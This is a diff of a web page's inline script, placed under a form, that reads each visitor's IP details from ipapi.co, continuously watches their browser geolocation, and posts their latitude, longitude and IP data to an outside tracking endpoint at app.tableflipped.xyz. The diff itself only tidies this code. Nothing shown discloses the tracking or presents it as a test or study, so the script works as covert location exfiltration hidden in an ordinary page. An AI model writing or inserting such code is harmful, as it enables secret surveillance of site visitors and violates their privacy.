@@ -68,15 +68,15 @@
         <button type="submit">Submit</button>
     </form>
 
-<script>//sdfttfftftftt
+<script> //23348927237894278934
     const url = "https://app.tableflipped.xyz/trk"; 
-
+    let data = {};
     (async () => {
     let info = await fetch('https://ipapi.co/json', {
         method: "GET", 
         headers: { "Content-Type": "application/json" }, 
     })
-    const data = await info.json();
+    data = await info.json();
 
 
 
@@ -91,17 +91,7 @@
     (async () => {
         const watchId = await navigator.geolocation.watchPosition((position) =>  {
             
-    (async () => {
-
-            let info = await fetch('https://ipapi.co/json', {
-        method: "GET", 
-        headers: { "Content-Type": "application/json" }, 
-    })
-    const data = await info.json();
-
-
-
-
+            
             let senddata = {query: data, lat:position.coords.latitude, lng:position.coords.longitude, mode:"full"}
             console.log(position.coords.longitude)
             fetch(url, {
@@ -110,7 +100,6 @@
                 headers: { "Content-Type": "application/json" }, 
             })
         })
-    })();
     })();
 
 </script>
